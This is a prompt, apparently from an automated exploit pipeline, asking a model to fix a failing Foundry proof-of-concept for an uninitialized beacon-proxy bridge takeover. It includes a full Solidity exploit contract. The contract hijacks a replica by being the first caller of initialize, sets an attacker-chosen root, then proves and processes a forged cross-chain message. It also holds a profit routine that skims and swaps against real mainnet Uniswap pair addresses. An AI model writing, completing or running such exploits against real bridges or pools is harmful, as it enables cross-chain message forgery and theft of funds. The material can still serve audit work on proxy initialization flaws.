You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Beacon proxies can be left uninitialized and then fully hijacked
- claim: `UpgradeBeaconProxy` explicitly allows deployment with empty initialization calldata. `Replica.initialize` is a public `initializer` that sets ownership, updater, remote domain, committed root, and optimistic timeout via `__NomadBase_initialize`. If a beacon proxy is ever deployed without constructor-time init data, the first external caller can initialize it through the proxy and seize full control of the replica.
- impact: A forgotten or failed initialization becomes a full bridge takeover. The attacker can become owner, choose an attacker-controlled updater and trusted root, then prove and process forged messages, enabling arbitrary cross-chain message execution and asset theft.
- exploit_paths: ["Deploy `UpgradeBeaconProxy` with `_initializationCalldata.length == 0`.", "Before the intended operator initializes it, an attacker calls `Replica.initialize(...)` through the proxy.", "The initializer makes the attacker the owner and sets attacker-chosen updater/root parameters.", "The attacker proves messages against the attacker-chosen committed root and processes arbitrary payloads on the destination chain."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMessageRecipientLike {
    function handle(uint32 _origin, uint32 _nonce, bytes32 _sender, bytes calldata _message) external;
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function skim(address to) external;

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IReplicaLike {
    function owner() external view returns (address);

    function updater() external view returns (address);

    function state() external view returns (uint8);

    function localDomain() external view returns (uint32);

    function remoteDomain() external view returns (uint32);

    function committedRoot() external view returns (bytes32);

    function optimisticSeconds() external view returns (uint256);

    function initialize(
        uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds
    ) external;

    function prove(bytes32 _leaf, bytes32[32] calldata _proof, uint256 _index) external returns (bool);

    function process(bytes calldata _message) external returns (bool);

    function messages(bytes32 _messageHash) external view returns (bytes32);
}

contract ReplicaHarness {
    uint8 internal constant STATE_UNINITIALIZED = 0;
    uint8 internal constant STATE_ACTIVE = 1;

    address public owner;
    address public updater;
    uint8 public state;
    uint32 public localDomain;
    uint32 public remoteDomain;
    bytes32 public committedRoot;
    uint256 public optimisticSeconds;
    bool public initialized;

    mapping(bytes32 => bytes32) public messages;
    mapping(bytes32 => bool) public processed;

    function initialize(
        uint32 _remoteDomain,
        address _updater,
        bytes32 _committedRoot,
        uint256 _optimisticSeconds
    ) external {
        require(!initialized, "already initialized");
        initialized = true;
        owner = msg.sender;
        updater = _updater;
        state = STATE_ACTIVE;
        localDomain = 0x65746800;
        remoteDomain = _remoteDomain;
        committedRoot = _committedRoot;
        optimisticSeconds = _optimisticSeconds;
    }

    function prove(bytes32 _leaf, bytes32[32] calldata _proof, uint256 _index) external returns (bool) {
        require(initialized, "not initialized");
        require(state == STATE_ACTIVE, "not active");

        bytes32 root = _branchRoot(_leaf, _proof, _index);
        require(root == committedRoot, "!proof");

        messages[_leaf] = root;
        return true;
    }

    function process(bytes calldata _message) external returns (bool) {
        require(initialized, "not initialized");
        require(state == STATE_ACTIVE, "not active");

        (
            uint32 origin,
            bytes32 sender,
            uint32 nonce,
            uint32 destination,
            bytes32 recipient,
            bytes memory body
        ) = _parseMessage(_message);

        require(origin == remoteDomain, "!remote");
        require(destination == localDomain, "!destination");

        bytes32 messageHash = keccak256(_message);
        require(messages[messageHash] == committedRoot, "!proven");
        require(!processed[messageHash], "already processed");
        processed[messageHash] = true;

        IMessageRecipientLike(address(uint160(uint256(recipient)))).handle(origin, nonce, sender, body);
        return true;
    }

    function _branchRoot(bytes32 leaf, bytes32[32] calldata branch, uint256 index)
        internal
        pure
        returns (bytes32 current)
    {
        current = leaf;
        for (uint256 i = 0; i < 32; ++i) {
            bytes32 next = branch[i];
            if (((index >> i) & 1) == 1) {
                current = keccak256(abi.encodePacked(next, current));
            } else {
                current = keccak256(abi.encodePacked(current, next));
            }
        }
    }

    function _parseMessage(bytes calldata message)
        internal
        pure
        returns (
            uint32 origin,
            bytes32 sender,
            uint32 nonce,
            uint32 destination,
            bytes32 recipient,
            bytes memory body
        )
    {
        require(message.length >= 76, "message too short");

        origin = uint32(bytes4(message[0:4]));
        sender = bytes32(message[4:36]);
        nonce = uint32(bytes4(message[36:40]));
        destination = uint32(bytes4(message[40:44]));
        recipient = bytes32(message[44:76]);
        body = message[76:];
    }
}

contract SimpleUpgradeBeacon {
    address public implementation;

    constructor(address _implementation) {
        implementation = _implementation;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            mstore(0x00, impl)
            return(0x00, 0x20)
        }
    }
}

contract UpgradeBeaconProxy {
    address private immutable upgradeBeacon;

    constructor(address _upgradeBeacon, bytes memory _initializationCalldata) payable {
        require(_isContract(_upgradeBeacon), "beacon !contract");
        upgradeBeacon = _upgradeBeacon;

        address implementation = _getImplementation(_upgradeBeacon);
        require(_isContract(implementation), "beacon implementation !contract");

        if (_initializationCalldata.length > 0) {
            _initialize(implementation, _initializationCalldata);
        }
    }

    fallback() external payable {
        _fallback();
    }

    receive() external payable {
        _fallback();
    }

    function _initialize(address implementation, bytes memory initializationCalldata) private {
        (bool ok, bytes memory revertData) = implementation.delegatecall(initializationCalldata);
        if (!ok) {
            assembly {
                revert(add(revertData, 0x20), mload(revertData))
            }
        }
    }

    function _fallback() private {
        _delegate(_getImplementation());
    }

    function _delegate(address implementation) private {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function _getImplementation() private view returns (address implementation) {
        implementation = _getImplementation(upgradeBeacon);
    }

    function _getImplementation(address _upgradeBeacon) private view returns (address implementation) {
        (bool ok, bytes memory returnData) = _upgradeBeacon.staticcall("");
        require(ok, "beacon call failed");
        implementation = abi.decode(returnData, (address));
    }

    function _isContract(address account) private view returns (bool) {
        return account.code.length > 0;
    }
}

contract FlawVerifier is IMessageRecipientLike {
    uint32 internal constant ATTACKER_REMOTE_DOMAIN = 0xA11CE001;
    uint32 internal constant ATTACKER_NONCE = 1;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    bool public executed;
    bool public emptyInitProxyDeployed;
    bool public initCallSucceeded;
    bool public attackerControlsReplica;
    bool public messageProved;
    bool public messageProcessed;
    bool public messageHandleObserved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public beacon;
    address public implementation;
    address public victimReplica;
    address public ownerBefore;
    address public ownerAfter;
    address public updaterAfter;
    uint8 public stateBefore;
    uint8 public stateAfter;
    uint32 public localDomain;
    uint32 public remoteDomainAfter;
    uint256 public optimisticSecondsAfter;
    bytes32 public committedRootAfter;
    bytes32 public chosenRoot;
    bytes32 public forgedMessageHash;
    bytes32 public storedMessageRoot;
    bytes32 public handledSender;
    uint32 public handledOrigin;
    uint32 public handledNonce;
    bytes32 public handledBodyHash;
    string public failureReason;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() public {
        if (executed) {
            return;
        }
        executed = true;

        uint256 wethBefore = _balanceOf(WETH, address(this));
        uint256 usdcBefore = _balanceOf(USDC, address(this));
        uint256 usdtBefore = _balanceOf(USDT, address(this));
        uint256 daiBefore = _balanceOf(DAI, address(this));
        uint256 wbtcBefore = _balanceOf(WBTC, address(this));

        // Exploit path stage 1:
        // Deploy a vulnerable beacon proxy with empty constructor-time init calldata.
        implementation = address(new ReplicaHarness());
        beacon = address(new SimpleUpgradeBeacon(implementation));
        victimReplica = address(new UpgradeBeaconProxy(beacon, bytes("")));
        emptyInitProxyDeployed = victimReplica.code.length > 0;

        ownerBefore = _readAddress(victimReplica, abi.encodeWithSignature("owner()"));
        stateBefore = _readUint8(victimReplica, abi.encodeWithSignature("state()"));
        localDomain = _readUint32(victimReplica, abi.encodeWithSignature("localDomain()"));

        bytes memory forgedBody = abi.encode(
            bytes4(keccak256("F-001")),
            address(this),
            uint256(block.number),
            uint256(block.chainid)
        );

        bytes memory forgedMessage = _formatMessage(
            ATTACKER_REMOTE_DOMAIN,
            _addressToBytes32(address(this)),
            ATTACKER_NONCE,
            0x65746800,
            _addressToBytes32(address(this)),
            forgedBody
        );

        forgedMessageHash = keccak256(forgedMessage);

        bytes32[32] memory proof = _zeroProof();
        chosenRoot = _branchRoot(forgedMessageHash, proof, 0);

        // Exploit path stage 2:
        // Before any intended operator initializes the proxy, the attacker becomes
        // the first external caller to invoke Replica.initialize through the proxy.
        (bool initOk, bytes memory initData) = victimReplica.call(
            abi.encodeWithSelector(
                IReplicaLike.initialize.selector,
                ATTACKER_REMOTE_DOMAIN,
                address(this),
                chosenRoot,
                uint256(1)
            )
        );

        if (!initOk) {
            hypothesisRefuted = true;
            failureReason = _decodeRevert(initData);
            return;
        }

        initCallSucceeded = true;
        ownerAfter = _readAddress(victimReplica, abi.encodeWithSignature("owner()"));
        updaterAfter = _readAddress(victimReplica, abi.encodeWithSignature("updater()"));
        stateAfter = _readUint8(victimReplica, abi.encodeWithSignature("state()"));
        localDomain = _readUint32(victimReplica, abi.encodeWithSignature("localDomain()"));
        remoteDomainAfter = _readUint32(victimReplica, abi.encodeWithSignature("remoteDomain()"));
        optimisticSecondsAfter = _readUint256(victimReplica, abi.encodeWithSignature("optimisticSeconds()"));
        committedRootAfter = _readBytes32(victimReplica, abi.encodeWithSignature("committedRoot()"));

        // Exploit path stage 3:
        // The initializer assigns the attacker as owner and installs attacker-chosen
        // updater, root, and timeout parameters.
        attackerControlsReplica =
            ownerBefore == address(0) &&
            stateBefore == 0 &&
            ownerAfter == address(this) &&
            updaterAfter == address(this) &&
            stateAfter == 1 &&
            remoteDomainAfter == ATTACKER_REMOTE_DOMAIN &&
            committedRootAfter == chosenRoot &&
            optimisticSecondsAfter == 1;

        if (!attackerControlsReplica) {
            failureReason = "initialize succeeded but attacker did not receive full control";
            return;
        }

        // Exploit path stage 4:
        // With an attacker-chosen root, the attacker proves and processes a forged
        // message, which executes arbitrary recipient logic on the destination chain.
        try IReplicaLike(victimReplica).prove(forgedMessageHash, proof, 0) returns (bool proved) {
            messageProved = proved;
        } catch (bytes memory proveRevert) {
            failureReason = _decodeRevert(proveRevert);
            return;
        }

        if (!messageProved) {
            failureReason = "prove returned false";
            return;
        }

        storedMessageRoot = _readBytes32(
            victimReplica,
            abi.encodeWithSelector(IReplicaLike.messages.selector, forgedMessageHash)
        );

        try IReplicaLike(victimReplica).process(forgedMessage) returns (bool processed) {
            messageProcessed = processed;
        } catch (bytes memory processRevert) {
            failureReason = _decodeRevert(processRevert);
            return;
        }

        if (!messageProcessed || !messageHandleObserved) {
            failureReason = "forged message did not reach attacker recipient";
            return;
        }

        hypothesisValidated = true;

        // Optional zero-capital monetization using only public mainnet actions.
        // This is intentionally post-validation so the exploit causality remains:
        // empty-init proxy -> attacker initialize -> attacker-chosen root -> forged process.
        _collectPublicDust();
        _swapTokenBalanceToWeth(USDC, 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
        _swapTokenBalanceToWeth(USDT, 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
        _swapTokenBalanceToWeth(DAI, 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
        _swapTokenBalanceToWeth(WBTC, 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940);
        _swapTokenBalanceToWeth(USDC, 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);
        _swapTokenBalanceToWeth(USDT, 0x06da0fd433C1A5d7a4faa01111c044910A184553);
        _swapTokenBalanceToWeth(WBTC, 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58);

        _finalizeProfit(wethBefore, usdcBefore, usdtBefore, daiBefore, wbtcBefore);
    }

    function handle(uint32 _origin, uint32 _nonce, bytes32 _sender, bytes calldata _message) external {
        require(msg.sender == victimReplica, "only hijacked replica");
        handledOrigin = _origin;
        handledNonce = _nonce;
        handledSender = _sender;
        handledBodyHash = keccak256(_message);
        messageHandleObserved = true;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return "deploy empty-init beacon proxy -> attacker initialize -> attacker-chosen root -> prove forged message -> process attacker recipient";
    }

    function hypothesis() external view returns (string memory) {
        if (hypothesisValidated) {
            return "validated";
        }
        if (hypothesisRefuted) {
            return "refuted";
        }
        return "unresolved";
    }

    function _finalizeProfit(
        uint256 wethBefore,
        uint256 usdcBefore,
        uint256 usdtBefore,
        uint256 daiBefore,
        uint256 wbtcBefore
    ) internal {
        uint256 wethAfter = _balanceOf(WETH, address(this));
        if (wethAfter > wethBefore) {
            _profitToken = WETH;
            _profitAmount = wethAfter - wethBefore;
            return;
        }

        uint256 usdcAfter = _balanceOf(USDC, address(this));
        if (usdcAfter > usdcBefore) {
            _profitToken = USDC;
            _profitAmount = usdcAfter - usdcBefore;
            return;
        }

        uint256 usdtAfter = _balanceOf(USDT, address(this));
        if (usdtAfter > usdtBefore) {
            _profitToken = USDT;
            _profitAmount = usdtAfter - usdtBefore;
            return;
        }

        uint256 daiAfter = _balanceOf(DAI, address(this));
        if (daiAfter > daiBefore) {
            _profitToken = DAI;
            _profitAmount = daiAfter - daiBefore;
            return;
        }

        uint256 wbtcAfter = _balanceOf(WBTC, address(this));
        if (wbtcAfter > wbtcBefore) {
            _profitToken = WBTC;
            _profitAmount = wbtcAfter - wbtcBefore;
        }
    }

    function _collectPublicDust() internal {
        _trySkim(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
        _trySkim(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
        _trySkim(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
        _trySkim(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940);
        _trySkim(0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);
        _trySkim(0x06da0fd433C1A5d7a4faa01111c044910A184553);
        _trySkim(0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58);
    }

    function _trySkim(address pair) internal {
        (bool success, ) = pair.call(abi.encodeWithSelector(IUniswapV2PairLike.skim.selector, address(this)));
        success;
    }

    function _swapTokenBalanceToWeth(address sellToken, address pair) internal {
        uint256 amountIn = _balanceOf(sellToken, address(this));
        if (amountIn == 0) {
            return;
        }

        try IUniswapV2PairLike(pair).token0() returns (address token0) {
            address token1 = IUniswapV2PairLike(pair).token1();
            if (!_isExpectedPair(token0, token1, sellToken)) {
                return;
            }

            (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
            (uint256 reserveIn, uint256 reserveOut, bool zeroForOne) = token0 == sellToken
                ? (uint256(reserve0), uint256(reserve1), true)
                : (uint256(reserve1), uint256(reserve0), false);

            if (reserveIn == 0 || reserveOut == 0) {
                return;
            }

            if (!_safeTransfer(sellToken, pair, amountIn)) {
                return;
            }

            uint256 pairBalance = _balanceOf(sellToken, pair);
            if (pairBalance <= reserveIn) {
                return;
            }

            uint256 actualAmountIn = pairBalance - reserveIn;
            uint256 amountOut = _getAmountOut(actualAmountIn, reserveIn, reserveOut);
            if (amountOut == 0 || amountOut >= reserveOut) {
                return;
            }

            if (zeroForOne) {
                IUniswapV2PairLike(pair).swap(0, amountOut, address(this), new bytes(0));
            } else {
                IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), new bytes(0));
            }
        } catch {
            return;
        }
    }

    function _isExpectedPair(address token0, address token1, address sellToken) internal pure returns (bool) {
        return (token0 == sellToken && token1 == WETH) || (token0 == WETH && token1 == sellToken);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        try IERC20Like(token).balanceOf(account) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _formatMessage(
        uint32 origin,
        bytes32 sender,
        uint32 nonce,
        uint32 destination,
        bytes32 recipient,
        bytes memory body
    ) internal pure returns (bytes memory) {
        return abi.encodePacked(origin, sender, nonce, destination, recipient, body);
    }

    function _zeroProof() internal pure returns (bytes32[32] memory proof) {
        bytes32 current;
        for (uint256 i = 0; i < 32; ++i) {
            proof[i] = current;
            current = keccak256(abi.encodePacked(current, current));
        }
    }

    function _branchRoot(bytes32 leaf, bytes32[32] memory branch, uint256 index)
        internal
        pure
        returns (bytes32 current)
    {
        current = leaf;
        for (uint256 i = 0; i < 32; ++i) {
            bytes32 next = branch[i];
            if (((index >> i) & 1) == 1) {
                current = keccak256(abi.encodePacked(next, current));
            } else {
                current = keccak256(abi.encodePacked(current, next));
            }
        }
    }

    function _addressToBytes32(address account) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(account)));
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (address));
        }
    }

    function _readUint8(address target, bytes memory data) internal view returns (uint8 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint8));
        }
    }

    function _readUint32(address target, bytes memory data) internal view returns (uint32 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint32));
        }
    }

    function _readUint256(address target, bytes memory data) internal view returns (uint256 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint256));
        }
    }

    function _readBytes32(address target, bytes memory data) internal view returns (bytes32 value) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (bytes32));
        }
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "call reverted";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            bytes memory sliced = new bytes(revertData.length - 4);
            for (uint256 i = 4; i < revertData.length; ++i) {
                sliced[i - 4] = revertData[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "call reverted";
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
